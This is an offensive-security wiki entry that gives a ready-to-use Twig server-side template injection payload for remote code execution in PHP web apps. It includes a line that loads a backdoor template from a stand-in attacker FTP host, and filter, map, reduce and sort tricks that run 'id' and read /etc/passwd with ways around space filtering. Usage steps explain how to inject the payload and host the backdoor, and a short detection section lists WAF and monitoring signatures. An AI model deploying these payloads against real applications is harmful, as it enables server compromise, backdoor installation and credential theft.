---
type: code
language: twig
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - SSTI
  - Twig
  - RCE
  - payload
platforms:
  - Web
  - PHP
validated: true
---

# Twig-SSTI-Execute-System-Commands

## Code

```twig
{{self}}
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}
{{['id']|map('system')|join}}
{{['id',1]|sort('system')|join}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
```

## Description

This Twig template payload exploits SSTI by manipulating the environment to load external backdoors via FTP cache and registering an 'exec' callback for undefined filters. It then uses various Twig filters (filter, reduce, map, sort) on arrays to execute system commands like 'id' or 'cat /etc/passwd', achieving RCE without direct eval.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| attacker.net:2121 | Attacker's FTP server for hosting backdoor template | ftp://192.168.1.100:2121 |
| backdoor | Name of the backdoor template file on FTP | backdoor.twig |
| cat\x20/etc/passwd | Escaped command for file read (\x20 for space) | cat\x20/etc/shadow |
| cat$IFS/etc/passwd | Alternative space bypass using shell IFS | ls$IFS-l /

## Usage

Inject this payload into a Twig-rendered input field (e.g., user profile or search). Ensure an FTP server hosts the 'backdoor' template. The payload executes on render, displaying command output in the HTTP response. Use in procedures like [[procedures/Exploit-Twig-SSTI-for-Remote-Code-Execution]] for initial RCE in PHP apps.

## Detection

- Monitor web server logs for anomalous Twig rendering errors or filter callbacks.
- Detect FTP connections from the web server process to external IPs.
- WAF rules for SSTI patterns like '{{_self.env.' or '|filter('system')'.
- File integrity monitoring on /etc/passwd access or unexpected process executions (e.g., via auditd).

## Related

- [[procedures/Exploit-Twig-SSTI-for-Remote-Code-Execution]]
